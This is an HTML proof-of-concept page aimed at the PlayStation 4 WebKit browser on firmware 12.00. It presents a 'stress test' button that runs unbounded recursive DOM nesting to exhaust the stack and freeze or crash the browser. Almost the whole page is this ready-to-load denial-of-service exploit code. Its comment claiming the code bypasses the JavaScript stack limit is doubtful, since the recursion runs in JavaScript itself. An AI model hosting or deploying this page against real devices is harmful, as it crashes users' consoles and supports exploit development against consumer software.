<!DOCTYPE html>
<html>
<head>
    <title>PS4 FW 12.00 - Stack Exhaustion PoC</title>
    <meta charset="UTF-8">
    <style>
        body {
            font-family: "Courier New", monospace;
            background-color: #ffffff;
            color: #000000;
            padding: 20px;
        }
        button {
            border: 2px solid #000;
            background: #eee;
            color: #000;
            padding: 10px 20px;
            font-family: inherit;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background: #ccc;
        }
        #status {
            margin-top: 20px;
            border-top: 1px solid #000;
            padding-top: 10px;
        }
    </style>
</head>
<body>
    <h2>PS4 WebKit: DOM Recursion Stress Test</h2>
    <p>Target: Firmware 12.00 (libSceNKWebKit.sprx)</p>
    <p>Description: Triggers unchecked stack exhaustion via deep DOM tree generation.</p>
    
    <button onclick="triggerStackOverflow()">START RECURSION TEST</button>
    
    <div id="status">Status: Idle</div>

    <script>
        function triggerStackOverflow() {
            var statusDiv = document.getElementById('status');
            statusDiv.innerHTML = "Status: <b>RUNNING...</b> (Browser should freeze now)";

            // Delay execution slightly to allow UI update
            setTimeout(function() {
                try {
                    // Logic: Deep DOM Recursion (Infinite AppendChild)
                    // This bypasses the JS stack limit and hits the WebCore rendering stack limit.
                    var root = document.createElement('div');
                    document.body.appendChild(root);
                    
                    function dive() {
                        var child = document.createElement('div');
                        // Adding text forces layout calculation, increasing stack usage per frame
                        child.innerText = "."; 
                        root.appendChild(child);
                        root = child;
                        dive(); // Recursive call
                    }
                    
                    dive();
                } catch(e) {
                    statusDiv.innerHTML = "Status: FAILED (Caught by Exception Handler: " + e + ")";
                }
            }, 100);
        }
    </script>
</body>
</html>
